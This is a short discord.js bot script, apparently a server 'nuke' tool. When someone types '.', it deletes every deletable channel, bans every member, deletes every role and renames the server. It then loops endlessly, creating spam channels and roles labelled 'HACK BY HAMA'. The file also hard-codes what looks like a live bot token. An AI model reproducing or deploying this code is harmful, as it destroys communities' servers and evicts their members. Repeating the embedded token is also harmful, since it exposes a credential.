const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("RaWeN Up");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("HACK BY HAMA", "text");///////bo channel 
        message.guild.createChannel("HACK BY HAMA", "voice");////bo voice
        message.guild.createRole({ name: "HACK BY HAMA" });////nawek dane bo role kan
      });
    }
  }
});

client.login("ODc4OTY3NTMzNzgzMzUxMjk2.YSI4Tg.XGb7-ROZ8UoB3etkDDwFCYSdH1s")
